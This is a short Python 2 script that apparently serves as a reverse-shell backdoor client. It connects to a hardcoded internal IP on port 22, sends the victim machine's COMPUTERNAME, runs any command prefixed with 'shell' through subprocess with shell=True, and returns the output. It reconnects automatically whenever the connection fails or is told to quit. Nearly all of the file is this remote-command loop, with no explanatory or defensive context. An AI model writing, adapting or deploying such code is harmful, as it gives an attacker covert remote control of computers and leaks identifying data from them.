import socket, os, subprocess, time

def createSocket():
    os.system('cls')
    global host
    global port
    global s
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    port = 22
    host = ('10.8.101.56')

def connect():
    try:
        print ('[!] Trying to connect to %s:%s'%(host,port))
        s.connect((host,port))
        print ('[*] Connection estabilished.')
        s.send(os.environ['COMPUTERNAME'])
        #popen = true
    except:
        print ('Could not connect.')
        time.sleep(10)
        connect()

def receive():
    hasQuit = False
    received = s.recv(1024)
    print 'receive: %s'%(receive)
    if received[0:4] == ('quit'):
        hasQuit = True
        s.close()
        createSocket()
        connect()
        receive()
    elif received[0:5] == ('shell'):
        proc2 = subprocess.Popen(received[6:], shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, stdin=subprocess.PIPE)
        args = proc2.stdout.read() + proc2.stderr.read()
    else:
        args = ('no valid input was given.')
    if (hasQuit == False):
        send(args)

def send(args):
    s.send(args)
    receive()

def main():
    createSocket()
    connect()
    receive()
    s.close()

main()
